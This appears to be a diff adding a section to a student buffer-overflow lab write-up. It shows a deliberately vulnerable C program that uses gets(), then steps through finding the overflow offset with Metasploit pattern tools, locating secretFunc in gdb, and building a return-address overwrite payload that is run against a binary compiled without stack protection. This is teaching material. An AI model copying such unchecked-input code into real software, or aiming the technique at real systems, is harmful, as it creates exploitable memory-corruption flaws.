@@ -2,6 +2,105 @@
 # Lab #1: Buffer Overflow
 # Task 1: Stack smashing by mermory overwritten
 
+
+---
+
+## 1.3. bof1.c
+
+### Analyzing the Source Code
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+
+void secretFunc()
+{
+    printf("Congratulation!\n");
+}
+
+int vuln()
+{
+    char array[200];
+    printf("Enter text:");
+    gets(array);
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    if (argv[1] == 0)
+    {
+        printf("Missing arguments\n");
+    }
+    vuln();
+    return 0;
+}
+```
+
+#### Key Points:
+1. The function `vuln` uses `gets`, which reads input without checking the buffer length, leading to buffer overflow.
+2. The target function `secretFunc` prints "Congratulation!\n".
+
+### Exploitation Plan
+
+1. **Overflow the buffer in `vuln` to overwrite the return address.**
+2. **Craft a payload that overwrites the return address with the address of `secretFunc`.**
+
+### Detailed Steps
+
+#### Step 1: Determine the Offset
+
+1. **Create a pattern using `pattern_create`:**
+   ```sh
+   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+   ```
+
+2. **Run the program with the pattern:**
+   ```sh
+   ./bof1.out
+   Enter text:
+   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9
+   ```
+
+3. **Find the offset using `pattern_offset`:**
+   ```sh
+   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
+   ```
+
+#### Step 2: Craft the Payload
+
+1. **Find the address of `secretFunc`:**
+   ```sh
+   (gdb) p secretFunc
+   $1 = {<text variable, no debug info>} 0x080484b6 <secretFunc>
+   ```
+
+2. **Create the payload:**
+   ```sh
+   python -c 'print("A" * 208 + "\xb6\x84\x04\x08")' > payload
+   ```
+
+3. **Verify the payload:**
+   ```sh
+   xxd payload
+   ```
+
+#### Step 3: Run the Program with the Payload
+
+1. **Compile the program:**
+   ```sh
+   gcc bof1.c -o bof1.out -fno-stack-protector -z execstack
+   ```
+
+2. **Run the program and provide the payload:**
+   ```sh
+   cat payload | ./bof1.out
+   ```
+
+### Expected Output
+
+If the payload is correct, the program should call `secretFunc` and print "Congratulation!\n".
+
 ---
 
 ## 1.2. bof2.c
